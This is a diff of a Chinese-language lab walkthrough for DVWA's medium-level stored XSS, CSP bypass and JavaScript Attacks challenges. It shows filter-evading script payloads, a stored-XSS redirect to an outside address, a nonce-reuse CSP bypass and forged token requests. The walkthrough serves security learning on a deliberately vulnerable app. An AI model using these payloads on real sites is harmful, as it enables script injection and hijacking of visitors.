@@ -1245,21 +1398,21 @@ Redirect everyone to a web page of your choosing.
 
 ### 觀察
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2078.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2086.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2079.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2087.png)
 
-經過測試後你會發現第一個 name input 防護比較脆弱，有機可趁，但有限制長度，不過可以直接修改 input 長度，後端並沒有檢查
+經過測試後你會發現第一個 name input 防護比較脆弱，有機可趁，但有限制長度，不過可以直接從前端修改 input 長度，後端並沒有檢查
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2080.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2088.png)
 
 ```jsx
 <sCript> alert(1) </sCript>
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2081.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2089.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2082.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2090.png)
 
 ### Done
 
@@ -1267,11 +1420,17 @@ Redirect everyone to a web page of your choosing.
 <sCript>location.href="https://1.1.1.1"</sCript>
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2083.png)
+```html
+http://dvwa.localtest/vulnerabilities/xss_s/
+```
+
+被重導到 1.1.1.1 了
+
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2091.png)
 
 ---
 
-# **Content Security Policy (CSP) Bypass**
+# 13. **Content Security Policy (CSP) Bypass**
 
 > Objective: Bypass Content Security Policy (CSP) and execute JavaScript in the page.
 > 
@@ -1297,11 +1456,11 @@ CSP 禁止 inline script，但如果要讓它執行只要在 script 上加上 `n
 <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2084.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2092.png)
 
 ---
 
-# **JavaScript Attacks**
+# 14. **JavaScript Attacks**
 
 > Objective:
 > 
@@ -1317,7 +1476,7 @@ CSP 禁止 inline script，但如果要讓它執行只要在 script 上加上 `n
 - 多出了一個新的 js file
 - 有兩種方式送出答案，一種是覆寫前端 js code 後送出，另一種是直接改 request 的 value，只要 value 正確就會過關
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2085.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2093.png)
 
 ```jsx
 function do_something(e) {
@@ -1332,7 +1491,7 @@ function do_elsesomething(e) {
 }
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2086.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2094.png)
 
 ```jsx
 do_something("abc")
@@ -1352,11 +1511,11 @@ e + document.getElementById('phrase').value + 'XX'
 // "XXChangeMeXX"
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2087.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2095.png)
 
 觀察正常流程
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2088.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2096.png)
 
 Request Body:
 
@@ -1366,7 +1525,7 @@ token=XXeMegnahCXX&phrase=ChangeMe&send=Submit
 
 可以發現只要將 success 倒過來再將前後加上 XX變成 `XXsseccusXX` 就是 token 答案了，phrase 則是 `success`，接下來只要想辦法送出它就行了
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2089.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2097.png)
 
 ```jsx
 do_something('success')
@@ -1383,8 +1542,17 @@ token=XXsuccessXX&phrase=ChangeMe&send=Submit
 token=XXsseccusXX&phrase=success&send=Submit
 ```
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2090.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2098.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2091.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%2099.png)
 
-![Untitled](DVWA%20-%20medium%20e321411a64fa4f7c9a4e674a9a8bf23e/Untitled%2092.png)
+![Untitled](DVWA%20-%20Med%20e3214/Untitled%20100.png)
+
+---
+
+# Ref
+
+DVWA 通关指南：SQL Injection-Blind(SQL 盲注) - 乌漆WhiteMoon - 博客园
+[https://www.cnblogs.com/linfangnan/p/13694057.html](https://www.cnblogs.com/linfangnan/p/13694057.html)
+SQL CAST and SQL CONVERT function overview
+[https://www.sqlshack.com/overview-of-the-sql-cast-and-sql-convert-functions-in-sql-server/](https://www.sqlshack.com/overview-of-the-sql-cast-and-sql-convert-functions-in-sql-server/)
